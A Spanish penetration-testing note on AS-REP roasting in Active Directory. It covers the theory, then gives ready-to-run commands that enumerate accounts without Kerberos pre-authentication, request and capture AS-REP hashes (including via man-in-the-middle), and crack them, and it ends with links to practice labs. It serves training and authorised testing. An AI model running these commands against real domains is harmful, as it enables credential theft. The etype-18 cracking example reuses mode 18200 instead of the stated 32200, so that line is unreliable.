# Teoría

El protocolo de autenticación #Kerberos funciona con tickets para otorgar acceso.

Un **ST** (*Service Ticket*) se obtiene presentando un **TGT** (*Ticket Granting Ticket*). Ese **TGT** previo se puede obtener validando un primer paso llamado **pre-autenticación**.

![[kerberos-preauth.excalidraw|center]]

El proceso de **pre-autenticación** puede ser eliminado de una cuenta mediante el atributo `DONT_REQ_PREAUTH` (`0x400000: Do not require Kerberos preauthentication`).

![[kerberos-dontpreauth.excalidraw|center]]

Las cuentas con `DONT_REQ_PREAUTH` son vulnerables a [[AS-REP roasting]].

# Vulnerabilidad

Algunas aplicaciones no soportan la **pre-autenticación** de Kerberos, por lo que es común encontrar usuarios con la opción `DONT_REQ_PREAUTH` habilitada.

Los atacantes pueden solicitar **TGT**s en nombre de cualquier usuario sin saber su contraseña (ya que no necesitan cifrar el *timestamp*) y crackear offline las *Session Keys* recibidas (debido a que van cifradas con la contraseña).

# Comprobación

Es posible listar los usuarios con `DONT_REQ_PREAUTH` mediante diferentes métodos:

~~~tabs

tab: bloodhound

```
MATCH (u:User)
WHERE u.enabled = true AND u.dontreqpreauth = true 
RETURN u
```

tab: kerbrute

<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/users, code = # fuerza bruta
kerbrute -domain {{domain}} -users {{users}}, lang = )"></span>
``` 
# fuerza bruta
kerbrute -domain ${DOMAIN} -users ${USERS}
```
<span type="end"></span>


tab: ldapsearch

<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/basedn, code = # anonymous
ldapsearch -H ldap://{{domain}} -x -b {{basedn}} &amp;#x27;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;#x27;, lang = )"></span>
``` 
# anonymous
ldapsearch -H ldap://${DOMAIN} -x -b ${BASEDN} '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
```
<span type="end"></span>

<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/dn,_/variables/hacking.md/password,_/variables/hacking.md/basedn, code = # credenciales
ldapsearch -H ldap://{{domain}} -D {{dn}} -w {{pass}} -b {{basedn}} &amp;#x27;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;#x27;, lang = )"></span>
``` 
# credenciales
ldapsearch -H ldap://${DOMAIN} -D ${DN} -w ${PASS} -b ${BASEDN} '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
```
<span type="end"></span>


tab: netexec

<span query="codeBlock(_/variables/hacking.md/target,_/variables/hacking.md/users, code = # fuerza bruta
netexec ldap {{target}} -u {{users}} -p '' -k, lang = )"></span>
``` 
# fuerza bruta
netexec ldap ${TARGET} -u ${USERS} -p '' -k
```
<span type="end"></span>

<span query="codeBlock(_/variables/hacking.md/target, code = # anonymous
netexec ldap {{target}} -u '' -p '' --query &amp;#x27;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;#x27; &amp;#x27;samAccountName&amp;#x27;, lang = )"></span>
``` 
# anonymous
netexec ldap ${TARGET} -u '' -p '' --query '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' 'samAccountName'
```
<span type="end"></span>

<span query="codeBlock(_/variables/hacking.md/target,_/variables/hacking.md/user,_/variables/hacking.md/password, code = # credenciales
netexec ldap {{target}} -u {{user}} -p {{pass}} --query &amp;#x27;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;#x27; &amp;#x27;samAccountName&amp;#x27;, lang = )"></span>
``` 
# credenciales
netexec ldap ${TARGET} -u ${USER} -p ${PASS} --query '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' 'samAccountName'
```
<span type="end"></span>


tab: powershell

<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/basedn, code = $ds=New-Object DirectoryServices.DirectorySearcher(New-Object DirectoryServices.DirectoryEntry(&amp;quot;LDAP://{{domain}}/{{basedn}}&amp;quot;))
$ds.Filter=&amp;quot;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;quot;
$ds.FindAll(), lang = )"></span>
``` 
$ds=New-Object DirectoryServices.DirectorySearcher(New-Object DirectoryServices.DirectoryEntry("LDAP://${DOMAIN}/${BASEDN}"))
$ds.Filter="(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$ds.FindAll()
```
<span type="end"></span>


tab: Rubeus

<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/users, code = # fuerza bruta
Rubeus.exe preauthscan /domain:{{domain}} /users:{{users}}, lang = )"></span>
``` 
# fuerza bruta
Rubeus.exe preauthscan /domain:${DOMAIN} /users:${USERS}
```
<span type="end"></span>

<span query="codeBlock(_/variables/hacking.md/users, code = # fuerza bruta con sesión
Rubeus.exe preauthscan /users:{{users}}, lang = )"></span>
``` 
# fuerza bruta con sesión
Rubeus.exe preauthscan /users:${USERS}
```
<span type="end"></span>

~~~

# Explotación

Es posible realizar el ataque solamente conociendo los **nombres de usuario del dominio sin credenciales**:

~~~tabs
tab: impacket

<span query="codeBlock(_/variables/hacking.md/users,_/variables/hacking.md/domain, code = GetNPUsers.py -usersfile {{users}} -no-pass -outputfile asreproast.txt &amp;#x27;{{domain}}/&amp;#x27;, lang = )"></span>
``` 
GetNPUsers.py -usersfile ${USERS} -no-pass -outputfile asreproast.txt '${DOMAIN}/'
```
<span type="end"></span>


tab: netexec

<span query="codeBlock(_/variables/hacking.md/target,_/variables/hacking.md/users, code = nxc ldap {{target}} -u {{users}} -p &amp;#x27;&amp;#x27; --asreproast asreproast.txt, lang = )"></span>
``` 
nxc ldap ${TARGET} -u ${USERS} -p '' --asreproast asreproast.txt
```
<span type="end"></span>

~~~

**Con credenciales en el dominio**, es posible obtener todos los hashes sin fuerza bruta, listando los usuarios con `DONT_REQ_PREAUTH`:

~~~tabs
tab: impacket

<span query="codeBlock(_/variables/hacking.md/domain, code = # anonymous
GetNPUsers.py -request -outputfile asreproast.txt &amp;#x27;{{domain}}/&amp;#x27;, lang = )"></span>
``` 
# anonymous
GetNPUsers.py -request -outputfile asreproast.txt '${DOMAIN}/'
```
<span type="end"></span>

<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/user,_/variables/hacking.md/password, code = # credenciales
GetNPUsers.py -request -outputfile asreproast.txt &amp;#x27;{{domain}}/{{user}}:{{password}}&amp;#x27;, lang = )"></span>
``` 
# credenciales
GetNPUsers.py -request -outputfile asreproast.txt '${DOMAIN}/${USER}:${PASS}'
```
<span type="end"></span>


tab: netexec

<span query="codeBlock(_/variables/hacking.md/target, code = # anonymous
nxc ldap {{target}} -u '' -p '' --asreproast asreproast.txt, lang = )"></span>
``` 
# anonymous
nxc ldap ${TARGET} -u '' -p '' --asreproast asreproast.txt
```
<span type="end"></span>

<span query="codeBlock(_/variables/hacking.md/target,_/variables/hacking.md/user,_/variables/hacking.md/password, code = # credenciales
nxc ldap {{target}} -u {{user}} -p {{password}} --asreproast asreproast.txt, lang = )"></span>
``` 
# credenciales
nxc ldap ${TARGET} -u ${USER} -p ${PASS} --asreproast asreproast.txt
```
<span type="end"></span>


tab: Rubeus

<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/user,_/variables/hacking.md/password, code = # credenciales
Rubeus.exe asreproast /domain:{{domain}} /user:{{user}} /password:{{password}} /outfile:asreproast.txt, lang = )"></span>
``` 
# credenciales
Rubeus.exe asreproast /domain:${DOMAIN} /user:${USER} /password:${PASS} /outfile:asreproast.txt
```
<span type="end"></span>

```
# sesión
Rubeus.exe asreproast /outfile:asreproast.txt
```

~~~

### ASREProasting via MitM

Otra forma de realizar AS-REP roasting **sin depender de que la pre-autenticación esté deshabilitada** es tener una posición de **Man-in-the-Middle** en la red y capturar AS-REPs:

~~~tabs
tab: ASRepCatcher

<span query="codeBlock(_/variables/hacking.md/target, code = ASRepCatcher -dc {{target}}, lang = )"></span>
``` 
ASRepCatcher -dc ${TARGET}
```
<span type="end"></span>

>[!tip] --disable-spoofing / --stop-spoofing

~~~

### Cracking

Es posible **crackear los hashes** obtenidos mediante `netexec`, `GetNPUsers` y `Rubeus` usando los siguientes comandos:

~~~tabs
tab: hashcat

>[!tldr] 18200 | Kerberos 5, etype 23, AS-REP

<span query="codeBlock(_/variables/hacking.md/wordlist, code = hashcat -m 18200 asreproast.txt {{wordlist}}, lang = )"></span>
``` 
hashcat -m 18200 asreproast.txt ${WORDLIST}
```
<span type="end"></span>


tab: john

>[!tldr] --format=krb5asrep

<span query="codeBlock(_/variables/hacking.md/wordlist, code = john --wordlist={{wordlist}} asreproast.txt, lang = )"></span>
``` 
john --wordlist=${WORDLIST} asreproast.txt
```
<span type="end"></span>

~~~

Es posible **crackear los hashes** obtenidos mediante `ASRepCatcher` usando el siguiente comando:

~~~tabs
tab: hashcat

>[!tldr] 32200 | Kerberos 5, etype 18, AS-REP

<span query="codeBlock(_/variables/hacking.md/wordlist, code = hashcat -m 18200 asreproast.txt {{wordlist}}, lang = )"></span>
``` 
hashcat -m 18200 asreproast.txt ${WORDLIST}
```
<span type="end"></span>

~~~

# Entornos de práctica

### Ofensivo

~~~tabs

tab: HTB

```cardlink
url: https://app.hackthebox.com/machines/Forest
title: "Forest (Easy)"
description: Forest is an easy Windows machine that showcases a Domain Controller (DC) for a domain in which Exchange Server has been installed. The DC allows anonymous LDAP binds, which are used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes, compromising the system.
host: app.hackthebox.com
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/7dedecb452597150647e73c2dd6c24c7.png
favicon: https://www.hackthebox.com/images/landingv3/favicon.png
```

<br/>

```cardlink
url: https://app.hackthebox.com/machines/Sauna
title: "Sauna (Easy)"
description: Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn&amp;#039;t require Kerberos pre-authentication. This hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions. BloodHound reveals that this user has the DS-Replication-Get-Changes-All extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with Impacket&amp;#039;s psexec.py in order to gain a shell on the box as NT_AUTHORITY\SYSTEM.
host: app.hackthebox.com
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/f31d5d0264fadc267e7f38a9d7729d14.png
favicon: https://www.hackthebox.com/images/landingv3/favicon.png
```

<br/>

```cardlink
url: https://app.hackthebox.com/machines/Blackfield
title: "Blackfield (Hard)"
description: Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous / Guest access to an SMB share is used to enumerate users. Once user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext password. With this user we can access an SMB share containing forensics artefacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator.
host: app.hackthebox.com
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/7c69c876f496cd729a077277757d219d.png
favicon: https://www.hackthebox.com/images/landingv3/favicon.png
```


tab: HTB Academy

```cardlink
url: https://academy.hackthebox.com/module/details/176
title: "Windows Attacks & Defense (Tier II)"
description: Microsoft Active Directory (AD) has been, for the past 20+ years, the leading enterprise domain management suite, providing identity and access management, centralized domain administration, authentication, and much more. Throughout those years, the more integrated our applications and data have become with AD, the more exposed to a large-scale compromise we have become. In this module, we will walk through the most commonly abused and fruitful attacks against Active Directory environments that allow threat actors to perform horizontal and vertical privilege escalations in addition to lateral movement. One of the module's core goals is to showcase prevention and detection methods against the covered Active Directory attacks.
host: academy.hackthebox.com
image: https://academy.hackthebox.com/storage/modules/176/logo.png
favicon: https://www.hackthebox.com/images/landingv3/favicon.png
```

<br/>

```cardlink
url: https://academy.hackthebox.com/module/details/84
title: "Using CrackMapExec (Tier III)"
description: Active Directory presents a vast attack surface and often requires us to use many different tools during an assessment. The CrackMapExec tool, known as a "Swiss Army Knife" for testing networks, facilitates enumeration, attacks, and post-exploitation that can be leveraged against most any domain using multiple network protocols. It is a versatile and highly customizable tool that should be in any penetration tester's toolbox.
host: academy.hackthebox.com
image: https://academy.hackthebox.com/storage/modules/84/logo.png
favicon: https://www.hackthebox.com/images/landingv3/favicon.png
```


tab: THM

```cardlink
url: https://tryhackme.com/room/attacktivedirectory
title: "Attacktive Directory (Medium)"
description: 99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?
host: tryhackme.com
image: https://tryhackme-images.s3.amazonaws.com/room-icons/f38b047a2a7089147766099dffeb8a5d.png
favicon: https://tryhackme.com/favicon-96x96.png
```


tab: Labs

```cardlink
url: https://github.com/Orange-Cyberdefense/GOAD
title: Orange-Cyberdefense/GOAD
description: game of active directory
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://opengraph.githubassets.com/f88befa328133f58dac08e935efac301ac1dbcb37fba7134bda99fe083485b00/Orange-Cyberdefense/GOAD
```

<br/>

```cardlink
url: https://github.com/safebuffer/vulnerable-AD
title: safebuffer/vulnerable-AD
description: Create a vulnerable active directory that's allowing you to test most of the active directory attacks in a local lab
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://opengraph.githubassets.com/6df3b9c7bb50447380c8c44df0c16fe7b85ecc1c55a233697fad318da7515cac/safebuffer/vulnerable-AD
```

~~~

### Defensivo

~~~tabs

tab: HTB

```cardlink
url: https://app.hackthebox.com/sherlocks/Campfire-2
title: "Campfire-2 (Very Easy)"
description: In this Sherlock, players will go through Security logs from the Domain controller. We will work through what to look for to properly identify ASREP Roasting attack activity and to avoid false positives due to the complexity of Active Directory.
host: app.hackthebox.com
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/challenges/6bc24fc1ab650b25b4114e93a98f1eba.png
favicon: https://www.hackthebox.com/images/landingv3/favicon.png
```


tab: HTB Academy

```cardlink
url: https://academy.hackthebox.com/module/details/176
title: "Windows Attacks & Defense (Tier II)"
description: Microsoft Active Directory (AD) has been, for the past 20+ years, the leading enterprise domain management suite, providing identity and access management, centralized domain administration, authentication, and much more. Throughout those years, the more integrated our applications and data have become with AD, the more exposed to a large-scale compromise we have become. In this module, we will walk through the most commonly abused and fruitful attacks against Active Directory environments that allow threat actors to perform horizontal and vertical privilege escalations in addition to lateral movement. One of the module's core goals is to showcase prevention and detection methods against the covered Active Directory attacks.
host: academy.hackthebox.com
image: https://academy.hackthebox.com/storage/modules/176/logo.png
favicon: https://www.hackthebox.com/images/landingv3/favicon.png
```

<

```cardlink
url: https://academy.hackthebox.com/module/details/233
title: "Detecting Windows Attacks with Splunk (Tier II)"
description: This Hack The Box Academy module is focused on pinpointing attacks on Windows and Active Directory. Utilizing Splunk as the cornerstone for investigation, this training will arm participants with the expertise to adeptly identify Windows-based threats leveraging Windows Event Logs and Zeek network logs. Furthermore, participants will benefit from actual PCAP files associated with the discussed Windows and Active Directory attacks, enhancing their understanding of the respective attack patterns and techniques.
host: academy.hackthebox.com
image: https://academy.hackthebox.com/storage/modules/233/logo.png
favicon: https://www.hackthebox.com/images/landingv3/favicon.png
```

<br/>

```cardlink
url: https://academy.hackthebox.com/module/details/306
title: "Active Directory Hardening - Recon & Initial Access (Tier II)"
description: Active Directory (AD) presents a vast attack surface and can be challenging to secure and control. Small changes can have a cascading effect, introducing further issues into the environment. Novel attacks are released periodically, taking advantage of vulnerabilities and abusing default configurations. This module covers remediating common AD findings uncovered during penetration tests and best practices for AD hardening and ongoing maintenance, logging, and detection.
host: academy.hackthebox.com
image: https://academy.hackthebox.com/storage/modules/306/logo.png
favicon: https://www.hackthebox.com/images/landingv3/favicon.png
```

~~~
